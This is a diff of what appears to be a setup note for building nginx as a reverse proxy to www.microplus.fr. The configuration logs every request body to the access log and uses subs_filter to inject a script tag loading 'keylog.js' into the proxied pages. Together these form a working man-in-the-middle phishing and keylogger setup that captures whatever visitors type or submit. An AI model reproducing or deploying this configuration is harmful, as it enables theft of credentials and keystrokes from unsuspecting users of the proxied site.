@@ -33,18 +33,18 @@ cd nginx-1.9.7/ && ./configure \
 
 #### Modif nginx.conf
 http {
-+ 	log_format custom '$request_body';
-+	access_log /var/log/nginx/access.log custom;
--       include /etc/nginx/sites-enabled/*;
-+       include /etc/nginx/sites-enabled/default;
+add 	log_format custom '$request_body';
+add	access_log /var/log/nginx/access.log custom;
+del      include /etc/nginx/sites-enabled/*;
+add       include /etc/nginx/sites-enabled/default;
 
 #### Modif sites-available/default et sites-enabled/default
 
 
 	location / {
-+		echo_read_request_body;
-+		proxy_pass http://www.microplus.fr/;
-+		subs_filter "</div>" "</div><script/src='https://www.microplus.fr/secu/images/test/keylog.js'></script>" -o;
+add		echo_read_request_body;
+add		proxy_pass http://www.microplus.fr/;
+add		subs_filter "</div>" "</div><script/src='https://www.microplus.fr/secu/images/test/keylog.js'></script>" -o;
 
 	
 
